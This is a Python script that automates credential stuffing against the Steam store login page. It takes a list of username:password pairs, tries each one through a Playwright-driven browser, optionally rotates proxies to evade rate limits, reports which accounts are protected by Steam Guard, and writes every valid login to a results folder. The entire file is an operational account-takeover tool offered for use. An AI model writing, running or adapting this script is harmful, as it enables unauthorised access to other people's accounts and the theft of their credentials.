import re
from playwright.sync_api import sync_playwright
from pathlib import Path
import random  
import os
from datetime import datetime
from tkinter import Tk, filedialog  

proxy_message_displayed = False

def get_proxy_option():
    while True:
        print("Select an option:")
        print("1) Run without proxy (faster but not secure use VPN while using this) ")
        print("2) Run with Proxy (slowest but secure)")
        user_input = input("Enter your choice (1 or 2): ")

        if user_input in ["1", "2"]:
            return user_input
        else:
            print("Invalid input. Please enter 1 or 2.")


def get_login_file_path():
    root = Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename(title="Select a login text file")
    return file_path


def get_proxy_file_path():
    root = Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename(title="Select a proxy text file")
    return file_path


def remove_failed_credentials(file_path, username, password):
    with open(file_path, 'r') as login_file:
        lines = login_file.readlines()

    with open(file_path, 'w') as login_file:
        for line in lines:
            if not re.match(f'{re.escape(username)}:{re.escape(password)}', line):
                login_file.write(line)

proxy_option = get_proxy_option()



login_file_path = get_login_file_path()

if proxy_option == "2":

    proxy_file_path = get_proxy_file_path()
else:
    proxy_file_path = None



with open(login_file_path, 'r') as login_file:
    credentials_list = [line.strip() for line in login_file if line.strip()]

while credentials_list:
    if proxy_file_path is None and not proxy_message_displayed:
        print("Launching without a proxy.")
        proxy_message_displayed = True

    match = re.match(r'(.+?):(.+)', credentials_list.pop(0))
    if match:
        username, password = match.groups()
        password = password.split(' ')[0]
    else:
        print("Invalid credentials format. Skipping to the next one.")
        continue
    if proxy_option == "1":
        with sync_playwright() as p:
            browser = p.firefox.launch(headless=False, slow_mo=1000)
            context = browser.new_context(proxy={'server': random.choice(proxies)} if proxy_file_path else None)
            page = context.new_page()

            page.goto("https://store.steampowered.com/login/")

            page.fill('.newlogindialog_TextInput_2eKVn', username)
            page.fill('.newlogindialog_TextInput_2eKVn[type=password]', password)
            page.click('.newlogindialog_SubmitButton_2QgFE')

            page.wait_for_load_state('load')
            page.wait_for_timeout(3000)


                # Steam guard 
            
            if page.query_selector('.newlogindialog_AwaitingMobileConfText_7LmnT'):
                print(f"[🛡 ] INVALID | PROTECTED | {username} |  Moving on to the next user.")
                remove_failed_credentials(login_file_path, username, password)
                continue


                # Too many attempts
            elif page.query_selector('.newlogindialog_FailureDescription_3gFes'):
                print("[-]INVALID | Too many attempts")

                #Email codes    
            elif page.query_selector('.newlogindialog_ConfirmationEntryContainer_2AnqS'):
                print(f"[🛡 ] INVALID | PROTECTED | {username} |  Moving on to the next user.")
                remove_failed_credentials(login_file_path, username, password)
                continue


                #Password checker    
            elif page.query_selector('.newlogindialog_FormError_1Mcy9'):
                print(f"[-] INVALID | incorrect password or username | {username} |  Moving on to the next user.")
                remove_failed_credentials(login_file_path, username, password)
                continue


            elif page.query_selector('div.content'):
                print(f"[+] VALID | LOGIN SUCCESSFUL | {username} |  Moving on to the next user.")

                result_folder = "Result"
                Path(result_folder).mkdir(parents=True, exist_ok=True)

                timestamp_folder = datetime.now().strftime("%y-%m-%d")
                subfolder_path = os.path.join(result_folder, timestamp_folder)
                Path(subfolder_path).mkdir(parents=True, exist_ok=True)

                credentials_file_path = os.path.join(subfolder_path, f"{username}.txt")
                with open(credentials_file_path, 'w') as credentials_file:
                    credentials_file.write(f"Username: {username}\nPassword: {password}")
                print(f"The account has been saved on {credentials_file_path}")
                          
                page.wait_for_timeout(5000)
                remove_failed_credentials(login_file_path, username, password)
                continue
    else:
        with open(proxy_file_path, 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]



            proxy_failed = True

            

        while proxies:
            random_proxy = random.choice(proxies)

            try:
                with sync_playwright() as p:
                    browser = p.firefox.launch(headless=True, slow_mo=1000)
                    context = browser.new_context(proxy={'server': random_proxy})
                    page = context.new_page()


                    page.goto("https://store.steampowered.com/login/")

                    page.fill('.newlogindialog_TextInput_2eKVn', username)
                    page.fill('.newlogindialog_TextInput_2eKVn[type=password]', password)
                    if not proxy_failed:
                        print(f"Proxy {random_proxy} is working.")
                    page.click('.newlogindialog_SubmitButton_2QgFE')

                    page.wait_for_load_state('load')
                    page.wait_for_timeout(2000)
                    

                    # Steam guard 
                    if page.query_selector('.newlogindialog_AwaitingMobileConfText_7LmnT'):
                        print(f"[🛡 ] INVALID | PROTECTED |  Moving on to the next user. | Proxy: {random_proxy}")
                        proxy_failed = False  
                        remove_failed_credentials(login_file_path, username, password)
                        continue

                    #to many attempts
                    elif page.query_selector('.newlogindialog_FailureDescription_3gFes'):
                        print(f"[-] INVALID | Too many attempts | Proxy: {random_proxy}")


                     #email code     
                    elif page.query_selector('.newlogindialog_ConfirmationEntryContainer_2AnqS'):
                        print(f"[🛡 ] INVALID | PROTECTED | {username} | Moving on to the next user. | Proxy: {random_proxy}")
                        remove_failed_credentials(login_file_path, username, password)
                        continue

                    # incorrect password
                    elif page.query_selector('.newlogindialog_FormError_1Mcy9'):
                        print(f"[-] INVALID | incorrect password or username | {username} |  Moving on to the next user.")
                        remove_failed_credentials(login_file_path, username, password)
                        continue

                    # login successful
                    elif page.query_selector('div.content'):
                        print(f"[+] VALID | LOGIN SUCCESSFUL | {username}  | Proxy: {random_proxy} |  Moving on to the next user.")

                        result_folder = "Result"
                        Path(result_folder).mkdir(parents=True, exist_ok=True)


                        timestamp_folder = datetime.now().strftime("%y-%m-%d")
                        subfolder_path = os.path.join(result_folder, timestamp_folder)
                        Path(subfolder_path).mkdir(parents=True, exist_ok=True)


                        credentials_file_path = os.path.join(subfolder_path, f"{username}.txt")
                        with open(credentials_file_path, 'w') as credentials_file:
                            credentials_file.write(f"Username: {username}\nPassword: {password}")
                        print(f"The account has been saved on {credentials_file_path}")
                          
                        page.wait_for_timeout(10000)
                        remove_failed_credentials(login_file_path, username, password)
                        continue

            except Exception as e:
                print(f"Proxy {random_proxy} failed. Removing it from the list. Error: {e}")
                proxies.remove(random_proxy)
                continue  

            break

        if proxy_failed:
            print(f"Protected or All proxies failed for {username}. Moving on to the next user.")

